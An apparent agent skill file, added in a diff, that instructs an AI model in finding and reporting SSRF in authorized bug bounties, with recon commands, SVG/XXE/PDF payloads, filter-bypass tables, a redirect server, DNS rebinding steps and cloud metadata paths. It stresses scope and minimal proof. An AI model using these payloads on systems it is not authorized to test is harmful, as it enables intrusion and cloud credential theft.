@@ -1,0 +1,460 @@
+---
+name: ssrf-hunter
+description: Methodology for finding, confirming and reporting Server-Side Request Forgery (SSRF) in authorized bug bounty programs and pentests. Use whenever the user is testing a URL-fetching feature (webhooks, link previews, PDF/image/video processing, file import, proxies, GraphQL URL fields), sees url=/redirect=/callback= style parameters, gets an out-of-band callback from a target, needs SSRF filter or whitelist bypass ideas, wants to assess SSRF impact or severity, or is writing an SSRF report — even if they don't say "SSRF".
+version: 1.0
+---
+
+<!--
+HOW TO USE THIS FILE (portable, single-file)
+- Claude: save as ssrf-hunter/SKILL.md (Skills), or paste into a Project's instructions.
+- ChatGPT: paste into a Custom GPT's Instructions, or upload as a Knowledge file.
+- Gemini: paste into a Gem's instructions.
+- Cursor / Windsurf / Copilot / Cline: save as .cursor/rules/ssrf-hunter.md,
+  .windsurfrules, .github/copilot-instructions.md, or AGENTS.md.
+- Any other LLM or agent: paste as the system prompt or attach as context.
+- Humans: it reads fine as a checklist.
+The YAML header above is used by tools that support skills; others ignore it.
+-->
+
+# SSRF Hunter
+
+**Role for the assistant:** You are an SSRF testing assistant for authorized security work. Guide the user through the phases below, generate test commands adapted to their target and stack, interpret their results, and help write the report. Skip ahead when the user is already further along (e.g. they already have a callback → Phase 3).
+
+SSRF happens when an application takes a user-supplied URL (or part of one) and fetches it server-side without proper validation. The server becomes a proxy with its own network position and credentials, reaching things the internet can't: loopback services, private ranges, cloud metadata.
+
+## Contents
+0. Scope check
+1. Recon
+1A. Authenticated targets (sessions, hidden endpoints, stored/delayed SSRF, roles)
+2. Vectors & injection points
+3. Detection & classification
+4. Filter, WAF & whitelist bypasses
+5. Demonstrating impact (minimal proof)
+6. Cloud metadata reference
+7. Reporting template & severity
+8. Remediation
+9. References
+
+> Based on *The Ultimate Guide to SSRF: Hunting, Bypassing and Exploiting in Modern Bug Bounty* by Lostsec (Oct 2026) — see References.
+
+---
+
+## Phase 0 — Scope check (always first)
+
+SSRF sends traffic from the target's servers into its internal network, so it has more blast radius than most web bugs. Before generating test commands, confirm:
+
+- The target is in scope for a program the user is enrolled in, or there is written pentest authorization.
+- The program's rules allow SSRF/internal testing (some forbid metadata or internal hosts).
+- Automated scanning rates fit the program's limits.
+
+If scope hasn't been mentioned, ask once, briefly. If the target clearly isn't the user's to test and there's no authorization, don't help attack it.
+
+---
+
+## Phase 1 — Recon: find candidate endpoints
+
+Goal: a deduplicated list of URLs and features that make the server fetch something.
+
+```bash
+# Live subdomains + tech fingerprint
+subfinder -d target.com -all -silent | httpx-toolkit -silent -sc -title -tech-detect -o live_assets.txt
+
+# Historical URLs filtered to SSRF-looking params
+cat live_assets.txt | gau --threads 10 | gf ssrf | uro | tee ssrf_candidates.txt
+
+# Quick OOB sweep: replace param values with your callback domain
+cat ssrf_candidates.txt | qsreplace "http://YOUR_ID.oast.fun" | httpx-toolkit -silent -mc 200 -cl
+
+# Hidden parameter discovery
+ffuf -u "https://target.com/endpoint?FUZZ=http://YOUR_ID.oast.fun" -w ssrf_params.txt
+
+# Nuclei with interactsh
+nuclei -l ssrf_candidates.txt -tags ssrf
+```
+
+Google dorks (combine with `OR`):
+```
+site:*.target.com inurl:"url="
+site:*.target.com inurl:"callbackUrl=http"
+site:*.target.com inurl:"proxy?path="
+site:*.target.com inurl:"img_url="
+site:*.target.com inurl:"returnUrl="
+site:*.target.com inurl:"fetch?uri="
+site:*.target.com inurl:"src=http"
+```
+
+---
+
+## Phase 1A — Authenticated targets
+
+Most real SSRF sits behind login: webhooks, integrations, avatar uploads, report exports, SSO settings. The method is the same as for public endpoints. The extra work is keeping the session attached to every request and reaching features buried in multi-step flows.
+
+### 1A.1 Accounts
+- Use only your own test accounts, created on the program or provided by it (many programs require a specific email alias). Never use another person's session.
+- Create two or more accounts at different roles (user, admin, org owner) and, if possible, two separate orgs/tenants for cross-tenant checks.
+
+### 1A.2 Capture the session
+Log in through Burp and note what authenticated requests carry:
+- `Cookie: session=...`
+- `Authorization: Bearer eyJ...` (JWT / OAuth)
+- `X-API-Key: ...` or another custom header
+- A CSRF token (`X-CSRF-Token` header or `_csrf` body field)
+
+Export them once so every command can reuse them:
+```bash
+export COOKIE="session=abc123"
+export TOKEN="eyJ..."
+export CSRF="xyz"
+```
+
+### 1A.3 Pass auth to every tool
+```bash
+# curl (GET)
+curl -s -i "https://target.com/api/preview?url=http://YOUR_ID.oast.fun" \
+  -H "Cookie: $COOKIE" -H "Authorization: Bearer $TOKEN"
+
+# curl (JSON POST — most authenticated SSRF looks like this)
+curl -s -X POST "https://target.com/api/integrations/webhook" \
+  -H "Cookie: $COOKIE" -H "Authorization: Bearer $TOKEN" \
+  -H "X-CSRF-Token: $CSRF" -H "Content-Type: application/json" \
+  -d '{"name":"test","url":"http://webhook1.YOUR_ID.oast.fun/"}'
+
+# ffuf: hidden parameter discovery while logged in
+ffuf -u "https://target.com/api/fetch?FUZZ=http://YOUR_ID.oast.fun" -w ssrf_params.txt \
+  -H "Cookie: $COOKIE" -H "Authorization: Bearer $TOKEN"
+
+# httpx: OOB sweep with auth
+cat ssrf_candidates.txt | qsreplace "http://YOUR_ID.oast.fun" | \
+  httpx-toolkit -silent -H "Cookie: $COOKIE" -H "Authorization: Bearer $TOKEN" -mc 200
+
+# nuclei
+nuclei -l ssrf_candidates.txt -tags ssrf -H "Cookie: $COOKIE" -H "Authorization: Bearer $TOKEN"
+
+# katana: crawl as a logged-in user, including JS-discovered routes
+katana -u https://app.target.com -H "Cookie: $COOKIE" -jc -d 3 -o auth_urls.txt
+```
+
+### 1A.4 Find endpoints only visible after login
+`gau` and dorks mostly return public URLs, so recon has to happen inside the account:
+- **Walk every feature by hand** with Burp proxying, then crawl (Burp crawler or `katana` above).
+- **Mine JavaScript bundles.** Grep for `webhook`, `callbackUrl`, `import`, `fetch`, `proxy`, `/api/`. Admin-only routes often ship in the same bundle regular users download.
+  ```bash
+  cat auth_urls.txt | grep '\.js$' | xargs -I{} curl -s -H "Cookie: $COOKIE" {} | \
+    grep -Eo '"/api/[^"]+"|[a-zA-Z]+(Url|URL|Uri|Webhook|Callback)' | sort -u
+  ```
+- **API docs:** `/swagger.json`, `/openapi.json`, `/api-docs`, `/v2/api-docs`, GraphQL introspection, developer portal.
+- **Settings pages to prioritize:** integrations (Slack, Jira, "custom webhook"), SSO/SAML "metadata URL", custom domain, branding/logo URL, import from URL, scheduled reports/exports, notification channels, "test connection" buttons.
+
+### 1A.5 Stored and delayed SSRF
+Authenticated SSRF is often two-step: you save a URL, and the server fetches it later.
+1. **Save** a unique OAST subdomain in each field (`webhook1.`, `logo.`, `samlmeta.`, `rss.` + `YOUR_ID.oast.fun`) so you know exactly which input fired.
+2. **Trigger** the fetch: click "Test", cause the event the webhook listens to, export the report, re-render the page, or wait.
+3. **Keep the listener running for hours** — some fetches happen on a scheduler or queue worker. Note timestamps; a worker on different infra often has different network reach than the web tier.
+4. **Edit-after-validation:** if the URL is validated on create, check whether the update/PATCH endpoint, an import file or a bulk API applies the same validation.
+
+### 1A.6 Keep the session alive
+Tokens expire mid-scan, which silently turns results into 401s.
+- **Burp:** Settings → Sessions → Session handling rules → add a **login macro** that captures the new cookie / Bearer token / CSRF token from the response; scope it to Repeater, Intruder and Scanner. Add "Check session is valid" (e.g. a 401 or a "Sign in" string) so the macro only re-runs when needed.
+- **Scripts:** log in at the start of each run and re-export `COOKIE`/`TOKEN`:
+  ```bash
+  TOKEN=$(curl -s -X POST https://target.com/api/login \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASS\"}" | jq -r .token)
+  ```
+  Keep test credentials in environment variables, not in the file or shell history.
+- Watch rate limits; throttle tools (`ffuf -rate 10`, `nuclei -rl 10`) — authenticated endpoints often lock accounts faster.
+
+### 1A.7 Roles and access control
+- **Note the role required.** Admin-only SSRF is valid, but usually rated lower than one any self-signup user can hit.
+- **Test lower roles against higher-role endpoints.** Replay the admin's webhook/import request with a regular user's token (Burp *Autorize* or *AuthMatrix* automates this). SSRF + broken access control is typically rated higher than either alone.
+- **Unauthenticated replay.** Strip the cookie/token and resend — sometimes the fetch endpoint doesn't actually check auth.
+- **Cross-tenant (your own two orgs only):** check whether a URL saved in org A is fetched with org B's context or exposes shared infrastructure.
+
+---
+
+## Phase 2 — Vectors & injection points
+
+Ordinary pages rarely have SSRF. Features that *fetch on the server's behalf* do.
+
+**High-signal features:** webhooks and "test connection" buttons · link previews/unfurling · import from URL (CSV, images, calendars) · avatar/logo by URL · HTML→PDF / screenshot / export · image and document converters · RSS/Atom readers · SAML/OIDC metadata URLs · cloud storage/CDN integrations · SEO/analytics "check this URL" tools.
+
+**Parameter names:** `url, uri, link, src, source, href, path, dest, destination, redirect, redirect_uri, return, returnUrl, next, continue, target, to, out, view, page, feed, rss, host, domain, site, callback, callbackUrl, webhook, webhookUrl, endpoint, api, proxy, fetch, load, file, document, img, img_url, image, imageUrl, avatar, background, data, reference, referenceUrl, open, import, importUrl, sourceUrl, fetchUrl, targetUrl, devUrl, external`. Also check JSON bodies and nested objects.
+
+**Headers** (unique OAST subdomain per header so you know which fired; Burp's *Collaborator Everywhere* automates this):
+```
+Referer: http://ref.YOUR_ID.oast.fun/
+X-Forwarded-For: xff.YOUR_ID.oast.fun
+X-Forwarded-Host: xfh.YOUR_ID.oast.fun
+X-Original-URL: http://xou.YOUR_ID.oast.fun
+True-Client-IP: tci.YOUR_ID.oast.fun
+Client-IP: cip.YOUR_ID.oast.fun
+```
+
+**SVG uploads** (server rasterizes to PNG/JPEG):
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://YOUR_ID.oast.fun/svg" height="200" width="200"/>
+</svg>
+```
+
+**XML / XXE** — SOAP, SAML, RSS import, DOCX/XLSX/SVG uploads:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "http://YOUR_ID.oast.fun/xxe">]>
+<r>&x;</r>
+```
+
+**HTML→PDF (headless Chrome, wkhtmltopdf):**
+```html
+<img src="http://YOUR_ID.oast.fun/pdf">
+<iframe src="http://169.254.169.254/latest/meta-data/instance-id" width="600" height="100"></iframe>
+<iframe src="file:///etc/hostname"></iframe>
+```
+
+**Video processing (FFmpeg):** HLS playlists in uploaded media can make FFmpeg fetch segment URLs. Put an OAST URL in the playlist to confirm. (Public PoC: github.com/pflashpunk/ssrf-video.)
+
+**GraphQL:** run introspection, look for String args like `*Url`, `endpoint`, `source`, `webhook`:
+```graphql
+mutation { setWebhook(url: "http://YOUR_ID.oast.fun/gql") { id } }
+```
+
+**WebSocket proxies:** endpoints like `/ws-proxy?target=` — test against your own `ws://` listener first.
+
+**CRLF in outgoing requests:** `/fetch?url=http://allowed.com%0d%0aX-Test:%20YOUR_ID` — confirm the injected header arrives at your listener.
+
+---
+
+## Phase 3 — Detection & classification
+
+| Type | What you see | How to confirm |
+|---|---|---|
+| In-band | Fetched content returned in response | Point at your server (`python3 -m http.server 8080` on a VPS); look for your content in the reply |
+| Blind | Nothing returned, request still happens | Interactsh / Burp Collaborator / webhook.site / RequestRepo callback |
+| Semi-blind | No body, but timing / status / error differences | Compare open port, closed port, non-routable IP |
+
+```bash
+curl -s -i "https://target.com/api/preview?url=http://YOUR_ID.oast.fun/test"
+```
+
+Check before getting excited:
+- **Is the callback from the target?** Compare callback source IP to your own. Your browser, a public link-preview bot, or a scanner may be the caller.
+- **DNS-only vs HTTP.** DNS lookup without an HTTP request is usually Informative. Try ports 8080/8443/8000 or other schemes to see if TCP egress is firewalled.
+- **Semi-blind needs consistency.** Repeat each probe several times; one slow response is noise.
+
+Semi-blind probes:
+| Test | Observe |
+|---|---|
+| `http://127.0.0.1:22` | Fast response / SSH banner in error |
+| `http://127.0.0.1:65535` | Connection refused / different timing |
+| `http://10.0.0.1` | Timeout / longer response |
+| `:80` vs `:443` | Size, status, error differences |
+
+After confirming, map reachability **gently**: a handful of common ports on `127.0.0.1` (22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 11211, 27017) and a few gateways (`10.0.0.1`, `172.16.0.1`, `192.168.1.1`). Record status, length and timing per probe. Don't sweep whole subnets unless the program allows it. SSRFmap (github.com/swisskyrepo/SSRFmap) can help with detection.
+
+---
+
+## Phase 4 — Filter, WAF & whitelist bypasses
+
+If `127.0.0.1` / `localhost` / `169.254.169.254` are blocked, the filter is probably string-matching instead of checking resolved addresses. Try in this order (cheapest first) and **log which payload worked** — it goes in the report and the fix.
+
+### 4.1 Alternate IP representations
+| Form | Loopback | Metadata (169.254.169.254) |
+|---|---|---|
+| Short | `127.1`, `127.0.1`, `0` | — |
+| Decimal | `2130706433` | `2852039166` |
+| Octal | `0177.0.0.1` | `0251.0376.0251.0376` |
+| Hex | `0x7f000001` | `0xa9fea9fe` |
+| IPv6 | `[::1]`, `[::]`, `[0000::1]` | — |
+| IPv4-mapped IPv6 | `[::ffff:127.0.0.1]` | `[::ffff:169.254.169.254]` |
+| Other loopback | `127.127.127.127`, `127.0.0.2` | — |
+
+Also try `https://` and different ports.
+
+### 4.2 Hostnames that resolve internally
+```
+http://127.0.0.1.nip.io/
+http://169.254.169.254.nip.io/
+http://localtest.me/
+http://anything.127.0.0.1.sslip.io/
+```
+Verify with `nslookup` first.
+
+### 4.3 URL parser confusion
+| Technique | Payload | Idea |
+|---|---|---|
+| Userinfo | `http://allowed.com@127.0.0.1/` | `allowed.com` is the username |
+| Fragment | `http://127.0.0.1#@allowed.com/` | Validator sees allowed.com, client stops at `#` |
+| Backslash | `http://127.0.0.1\allowed.com/` | Some parsers turn `\` into `/` |
+| Encoded | `http://127.0.0.1%5callowed.com/`, `%23@` | Decode-then-validate ordering |
+| Multiple `@` | `http://127.1.1.1:80\@@127.2.2.2:80/` | Libraries pick different hosts |
+| Mixed | `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` | urllib2 / requests / urllib disagree |
+| Unicode | `http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/` | Normalization after validation |
+| Scheme | `0://evil.com:80;http://allowed.com:80/` | PHP `filter_var()` quirks |
+| Tomcat path | `http://allowed.com/..;/` | Path normalization |
+
+Behavior depends on language/library — use Phase 1 tech detection to narrow it.
+
+### 4.4 Open redirect chaining
+When only `allowed.com` URLs pass, find an open redirect there:
+```
+https://allowed.com/login?next=https://YOUR_SERVER/r
+https://allowed.com/go?url=https://YOUR_SERVER/r
+```
+Your `/r` returns a 302 — first to an OAST URL (confirms the backend follows redirects), then to `http://169.254.169.254/latest/meta-data/instance-id`.
+
+```python
+# redirect.py — python3 redirect.py 8000
+import sys, http.server
+TARGET = "http://YOUR_ID.oast.fun/redirect-followed"
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302); self.send_header("Location", TARGET); self.end_headers()
+http.server.HTTPServer(("", int(sys.argv[1])), H).serve_forever()
+```
+
+### 4.5 DNS rebinding (TOCTOU)
+Validator resolves once for the check, again for the fetch.
+1. Generate a hostname alternating between your public IP and `127.0.0.1` (e.g. lock.cmpxchg8b.com/rebinder.html → `*.rbndr.us`).
+2. Confirm with repeated `nslookup` that it flips.
+3. Submit repeatedly — success is probabilistic.
+4. A hit shows internal content or a response pattern matching the internal service.
+
+### 4.6 Alternate schemes (show they're accepted — that's a finding itself)
+| Scheme | What to show |
+|---|---|
+| `file://` | Harmless file: `/etc/hostname`, `C:/Windows/win.ini` |
+| `dict://` | Banner showing a service answers, e.g. `dict://127.0.0.1:6379/INFO` |
+| `gopher://` | That it's accepted (request to your own listener). Don't send state-changing protocol payloads to internal services |
+| `ftp://`, `ldap://`, `tftp://` | Callback to your listener |
+
+### 4.7 Method/header control
+If the vector lets you set the HTTP method or inject headers, note it — IMDSv2 token acquisition may be possible. Report the capability rather than pulling credentials unless the program explicitly permits it.
+
+---
+
+## Phase 5 — Demonstrate impact, minimally
+
+Programs pay for **demonstrated reach**, not damage. Prove access with the least sensitive data that makes the point, then stop and write it up. This protects the tester's standing in the program and keeps the test within authorization.
+
+- **Cloud metadata:** fetch identifying, non-secret paths (`instance-id`, `hostname`, IAM role **name** listing). Don't pull live credentials or user-data unless explicitly allowed — the role name already proves the credential store is reachable.
+- **Local files:** harmless files only (`/etc/hostname`, `/etc/passwd`, `C:/Windows/win.ini`). Not keys, shadow files, env vars, or app secrets.
+- **Internal services (Redis, Memcached, Elasticsearch, admin panels):** show the service answers (banner, version, read-only info). Don't write data, change config, or attempt code execution. Describe the escalation path in the report and let the program decide whether to authorize more.
+- **IMDSv2:** if the vector is GET-only, say so — it's a working control, and claiming otherwise gets reports downgraded.
+
+---
+
+## Phase 6 — Cloud metadata reference
+
+| Provider | Base | Safe proof | Sensitive (describe, don't fetch) | Notes |
+|---|---|---|---|---|
+| AWS EC2 | `http://169.254.169.254/latest/meta-data/` | `instance-id`, `hostname`, `ami-id`, `iam/security-credentials/` (role name) | `iam/security-credentials/<ROLE>`, `/latest/user-data` | IMDSv2 needs PUT token; also `http://instance-data/` |
+| AWS ECS | `http://169.254.170.2/` | Reachability | `v2/credentials/<id>` | |
+| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `instance/id`, `instance/hostname`, `project/project-id` | `instance/service-accounts/default/token` | Needs `Metadata-Flavor: Google` |
+| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `compute/vmId`, `compute/name` | `identity/oauth2/token` | Needs `Metadata: true` |
+| DigitalOcean | `http://169.254.169.254/metadata/v1/` | `id`, `hostname`, `region` | `user-data` | |
+| Alibaba | `http://100.100.100.200/latest/meta-data/` | `instance-id`, `image-id` | `ram/security-credentials/`, user-data | |
+| Oracle | `http://169.254.169.254/opc/v1/instance/` | `id`, `displayName` | — | v2 needs `Authorization: Bearer Oracle` |
+| OpenStack | `http://169.254.169.254/openstack/latest/meta_data.json` | `uuid`, `name` | — | |
+| Kubernetes | `https://kubernetes.default.svc/` | `/version` | Anything needing SA token | |
+
+Example impact wording:
+> The SSRF reaches AWS IMDS (IMDSv1). `/latest/meta-data/iam/security-credentials/` returned the role name `app-prod-role`. An attacker could request the next path for temporary credentials; I did not retrieve them per program rules. Impact depends on the role's permissions.
+
+---
+
+## Phase 7 — Reporting
+
+Keep impact claims tied to what was actually demonstrated. Precise reports get upgraded; overclaimed ones get downgraded.
+
+```markdown
+# SSRF in <feature> allows <what you reached>
+
+## Summary
+Endpoint, type (in-band / blind / semi-blind), highest-impact thing demonstrated.
+
+## Affected asset
+- URL / endpoint:
+- Parameter / field:
+- Auth required: yes/no
+- Minimum role: <any self-signup user / paid plan / org admin>
+- Fetch timing: immediate / on trigger (<what triggers it>) / scheduled (~<delay>)
+
+## Steps to reproduce
+1. Sign up / log in as <role>. Navigate to <Settings → Integrations → ...>.
+2. Save / send the request below (tokens redacted).
+3. Trigger the fetch: <click Test / wait N minutes / export report>.
+4. Observe <response / OAST callback with timestamp / timing difference>.
+
+    <exact raw HTTP request or curl>
+
+## Evidence
+- Callback log (source IP, timestamp, User-Agent) — source IP belongs to target
+- Response excerpt (redacted)
+- Screenshots
+
+## Bypass used (if any)
+e.g. "Filter blocks 127.0.0.1 but accepts decimal 2130706433."
+
+## Impact
+What you showed, then what it enables.
+
+## Suggested severity
+<rating> + CVSS vector if used. OWASP A10:2021.
+
+## Remediation
+(see Phase 8)
+```
+
+**Severity guide (illustrative — programs differ):**
+| Demonstrated | Typical rating |
+|---|---|
+| DNS lookup only | Informative / P5 |
+| HTTP callback from target infra | Low–Medium / P4 |
+| Internal port/service reachability | Medium / P3 |
+| Internal pages / unauthenticated internal APIs readable | High / P2 |
+| Cloud metadata reachable, local file read | High–Critical / P2–P1 |
+
+**Common reasons SSRF reports get closed:**
+- Callback came from the tester's browser or a public link-preview bot.
+- DNS-only, no HTTP.
+- Feature is *meant* to fetch external URLs and nothing internal was reached.
+- Testing went beyond scope (credential use, data modification) — can void the bounty.
+- Authenticated report with unclear repro steps — triagers couldn't reach the feature or trigger the delayed fetch.
+- Live session tokens pasted unredacted in the report.
+
+---
+
+## Phase 8 — Remediation
+
+- Allow-list destinations and schemes (http/https only); don't rely on regex or blacklists alone.
+- Resolve the hostname, validate the resolved IP against private/loopback/link-local ranges (including IPv6 and mapped forms), then connect to **that same IP** (defeats rebinding).
+- Disable automatic redirects, or re-validate every hop.
+- Enforce egress restrictions at the network layer so app servers can't reach metadata or internal admin ports.
+- AWS: require IMDSv2 with hop limit 1. GCP/Azure: rely on required metadata headers and block header injection.
+
+---
+
+## 9. References
+
+**Source guide**
+- Lostsec, *The Ultimate Guide to SSRF: Hunting, Bypassing and Exploiting in Modern Bug Bounty* (Oct 24, 2026)
+  - Original: https://medium.com/@lostsec/the-ultimate-guide-to-ssrf-hunting-bypassing-and-exploiting-in-modern-bug-bounty-a43fa34ba324
+  - Mirror: https://freedium-mirror.cfd/https://medium.com/@lostsec/the-ultimate-guide-to-ssrf-hunting-bypassing-and-exploiting-in-modern-bug-bounty-a43fa34ba324
+
+**Background**
+- OWASP Top 10 A10:2021 — SSRF: https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+- OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+- PortSwigger Web Security Academy — SSRF (free practice labs): https://portswigger.net/web-security/ssrf
+- AWS IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
+
+**Tools & wordlists mentioned**
+- gf SSRF pattern: https://github.com/coffinxp/GFpattren
+- SSRF bypass payload list: https://github.com/coffinxp/payloads
+- SVG SSRF payloads: https://github.com/coffinxp/img-payloads
+- Nuclei SSRF template: https://github.com/projectdiscovery/nuclei-templates (`dast/vulnerabilities/ssrf/`)
+- Interactsh: https://github.com/projectdiscovery/interactsh · web client: https://app.interactsh.com
+- SSRFmap: https://github.com/swisskyrepo/SSRFmap
+- FFmpeg/HLS SSRF PoC: https://github.com/pflashpunk/ssrf-video
+- DNS rebinding generator: https://lock.cmpxchg8b.com/rebinder.html
+- nip.io / sslip.io: https://nip.io · https://sslip.io
+- Burp extensions: Collaborator Everywhere, Autorize, AuthMatrix (BApp Store)
